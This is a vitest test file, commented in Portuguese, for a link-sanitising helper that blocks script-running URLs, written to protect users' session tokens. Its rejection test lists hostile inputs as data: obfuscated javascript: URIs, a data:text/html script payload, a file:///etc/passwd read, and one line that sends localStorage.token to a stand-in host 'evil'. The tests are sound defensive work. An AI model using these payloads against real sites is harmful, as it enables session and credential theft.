import { describe, expect, it } from 'vitest';
import { safeExternalHref } from './safeLink';

describe('safeExternalHref', () => {
    it('aceita http e https absolutos, devolvendo o link', () => {
        for (const url of [
            'https://meet.google.com/abc-defg-hij',
            'http://zoom.us/j/123',
            'https://wa.me/5511999999999',
        ]) {
            expect(safeExternalHref(url)).toBe(url);
        }
    });

    it('aceita caminho relativo do próprio app', () => {
        expect(safeExternalHref('/ajuda')).toBe('/ajuda');
    });

    // O caso que motivou o helper: link gravado por um personal e clicado pelo
    // ALUNO. Com o JWT em localStorage, qualquer um destes que passasse (num
    // navegador sem CSP nível 3) entregaria a sessão do aluno.
    it('rejeita esquema que executa script', () => {
        for (const url of [
            'javascript:alert(1)',
            'JavaScript:alert(1)',
            "JAVASCRIPT:fetch('https://evil/?t='+localStorage.token)",
            ' javascript:alert(1)',
            '\tjavascript:alert(1)',
            '\njavascript:alert(1)',
            'java\tscript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:msgbox(1)',
            'file:///etc/passwd',
        ]) {
            expect(safeExternalHref(url)).toBeNull();
        }
    });

    it('trata vazio, espaço, null e undefined como ausência de link', () => {
        expect(safeExternalHref('')).toBeNull();
        expect(safeExternalHref('   ')).toBeNull();
        expect(safeExternalHref(null)).toBeNull();
        expect(safeExternalHref(undefined)).toBeNull();
    });

    it('devolve a versão sem espaço nas pontas', () => {
        // Quem chama renderiza o valor devolvido; aprovar uma string e
        // renderizar outra reabriria o buraco.
        expect(safeExternalHref('  https://meet.google.com/x  ')).toBe(
            'https://meet.google.com/x',
        );
    });
});
